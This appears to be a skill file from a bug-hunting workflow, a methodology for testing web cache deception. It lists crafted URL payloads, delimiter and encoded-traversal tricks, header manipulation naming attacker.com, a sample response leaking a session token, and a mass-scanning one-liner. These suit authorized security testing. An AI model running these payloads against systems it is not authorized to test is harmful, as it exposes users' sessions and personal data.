---
name: web-cache-deception-testing
description: Web Cache Deception (WCD) testing — tricking a caching layer (CDN, reverse proxy) into storing a dynamic, authenticated, sensitive response as if it were a static asset, then retrieving that cached response unauthenticated. Covers file-extension appending, query-parameter cache-key manipulation, delimiter-based path confusion (semicolon, backtick, encoded path traversal), header-based cache manipulation, and mass-hunting automation with gau/httpx. Use this during Phase 3 (Vulnerability Testing — Info disclosure/Access control) of bughunting-workflow whenever the target sits behind a CDN/cache (Cloudflare, Akamai, Fastly, Varnish, nginx proxy_cache) and has authenticated pages showing PII/session data (/account, /profile, /dashboard, /settings). Also trigger on mentions of web cache deception, WCD, cache poisoning via extension, X-Cache HIT, or cacheable authenticated page.
---

# Web Cache Deception (WCD) Testing

Technique library for getting a cache to store a page it should never have cached — a *different* bug class from HTTP response splitting/cache poisoning (where the attacker controls what content gets cached for others); here the attacker tricks the cache into storing a *victim's own* authenticated response and then reads it back unauthenticated. Add new entries as new delimiter/bypass techniques or a different cache-layer target get validated from future writeups.

## Core theory

Root cause is a mismatch between how the **cache layer** and the **origin server** interpret the same URL:
- The cache decides "is this cacheable?" largely by looking at the URL's file extension (`.css`, `.js`, `.jpg` → treated as static, cached by default) — it usually doesn't know or care about the authentication state of the response.
- The origin server, when it receives `/account.css` (a path that doesn't map to a real static file), often falls back to routing logic that still serves the *dynamic* `/account` handler — ignoring the trailing extension entirely — and returns the user's real authenticated page content, just with a `.css`-shaped URL.

The cache then sees a `200 OK` response to a `.css`-extensioned request and stores it as a static asset, keyed only on the URL (not on the session/auth cookie). The **first person** who requests that crafted URL while authenticated is the unwitting victim — their real dynamic response gets cached — and every subsequent unauthenticated requester of that exact URL receives the victim's cached, sensitive content.

**Detection signal:** `X-Cache: HIT` (or provider-equivalent header) on a response to a path you engineered, combined with sensitive/dynamic-looking content (PII, a session token, an email) in the body. Response-time comparison (cached responses are faster) and identical content across repeated unauthenticated requests are secondary confirmation signals.

## Recorded technique: full WCD methodology
Source: [Mastering Web Cache Deception Vulnerabilities: An Advanced Bug Hunter's Guide](https://infosecwriteups.com/mastering-web-cache-deception-vulnerabilities-an-advanced-bug-hunters-guide-b7b500b482e3)

### Recon
1. Enumerate private/authenticated endpoints likely to hold PII or session data: `/account`, `/profile`, `/dashboard`, `/settings`, `/admin`, `/private`, `/my-account/orders`, `/user/details`, `/account/settings`.
2. Confirm the target sits behind a caching layer — check response headers for `X-Cache: HIT/MISS` or equivalent (`CF-Cache-Status`, `X-Cache-Hits`), and inspect `Cache-Control` directives on both static and dynamic responses. The GiftOfSpeed cache checker (or any online cache-behavior analyzer) can confirm caching infrastructure quickly.

### Exploitation chain (basic)
1. Pick a sensitive authenticated endpoint, e.g. `/user/profile`.
2. Append a static-looking file extension: `/user/profile.css`.
3. Request it while authenticated (as your own test account) — confirm the origin still returns the real dynamic profile content despite the fake extension, and that the response now carries cacheable headers / gets an `X-Cache: MISS` → `HIT` transition on a second request.
4. Request the same crafted URL **unauthenticated** (or from a different session/incognito) and check whether the cached, sensitive response comes back — this is the proof of exploitability.

### Technique: file-extension appending
Try common static extensions appended directly to sensitive paths:
```
.css .js .jpg .png .gif .woff .woff2 .ico .json .xml .pdf
```
```
https://target.com/account.css
https://target.com/dashboard.js
https://target.com/profile.jpg
```

### Technique: query-parameter cache-key manipulation
Some cache configs key on parameter *presence* (not value) or treat a `?file=`/`?callback=`-style parameter as a signal to cache, independent of auth state:
```
https://target.com/account?file=main.js
https://target.com/profile.js?test=123
https://target.com/api/user/data?callback=static.js
```

### Technique: delimiter-based path confusion
Different components in the request path (cache, WAF, origin router) can disagree on where the "real" path ends and a suffix begins — exploit that disagreement:
```
# Semicolon prefix — often stripped/ignored by routing but still seen by the cache as a static suffix
https://target.com/account;.css?test=123
https://target.com/dashboard;.js?test=123

# Encoded backtick delimiter
https://target.com/account%60.js?test=123
https://target.com/profile%60.css?test=123

# Wildcard-suffix combination
https://target.com/account.js/*
https://target.com/profile.css/*
```
Broader delimiter set worth sweeping per target: `~ \/ ; : // .. . _ - @ ? = # ! & $`, plus URL-encoded forms `%5c %3d %2f %2e %26 %23 %20 %0a %09 %00`.

### Technique: encoded path traversal into a static path
```
https://target.com/settings/%2e%2e/images/logo.png
https://target.com/admin/%2e%2e/scripts/app.js
```
(`%2e%2e` = encoded `../`) — makes the request *look* like it resolves into a known-static directory to the cache layer, while the origin still routes it to the dynamic handler.

### Technique: header-based cache/routing manipulation
```http
X-Original-URL: /admin/
X-Rewrite-URL: /profile/
X-Forwarded-Host: attacker.com
X-Forwarded-Path: /static.css
```
Same family as the trusted-header tricks in `recon-scanning-toolkit`'s manual bypass checklist — here applied specifically to influence which URL the *cache* thinks it's serving vs. which URL the *origin* actually routes.

### Full Burp Suite request/response example
```http
GET /account.php/poc.css HTTP/1.1
Host: vulnerable-example.com
User-Agent: Mozilla/5.0
Accept: text/css,*/*;q=0.1
Cache-Control: no-cache
```
Vulnerable response pattern:
```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=86400
X-Cache: HIT
Content-Type: text/css

/* body actually contains dynamic sensitive data despite text/css content-type: */
username: johndoe@example.com
session_token: 9f73b21d2e934f6e4cbdc8d83c4e9210
```

### Mass-hunting automation
```bash
# Sweep known sensitive-path patterns across all crawled URLs, appending a static suffix, and check for 200s
gau target.com | grep -E '/(account|profile|dashboard)' | \
  while read url; do echo "$url/style.css"; done | \
  httpx-toolkit -mc 200

# Manual single-URL verification
curl -I https://target.com/account.css
```

## Impact framing for report

- **Data exposure** — the first authenticated user who (unknowingly, e.g. via a crafted link sent by the attacker) hits the crafted URL has their session's response cached and served to every subsequent unauthenticated requester of that same URL.
- **Session hijacking** — if session tokens or auth cookies leak into the cached body (as in the example above), any anonymous visitor can lift and reuse them directly.
- **Account takeover** — cached PII (email, address, phone, security-question answers) can feed into account-recovery flows on this or other services.
- **Authentication bypass framing** — worth stating explicitly in the report: this isn't "just" an info leak, it's a mechanism that serves *authenticated-only* content to unauthenticated requesters, i.e. a practical bypass of the login requirement for that specific data.

Note the attack requires getting a victim to visit the crafted URL while authenticated (self-XSS-adjacent delivery problem) — for a full PoC, pair this with a realistic delivery vector (a shared/crafted link) rather than only demonstrating against your own test account, since triagers will ask how the victim's authenticated request gets triggered.

## Toolkit

- **PortSwigger Web Cache Deception Scanner** (Burp extension) — automated detection.
- **GiftOfSpeed Cache Checker** — online cache-behavior analysis.
- **gau** + **httpx-toolkit** — mass endpoint discovery and static-suffix sweep across a whole target (complements `recon-scanning-toolkit`).
- **curl -I** — quick manual `X-Cache` header check per URL.

<!-- Add new recorded techniques below this line as new WCD writeups are processed. -->
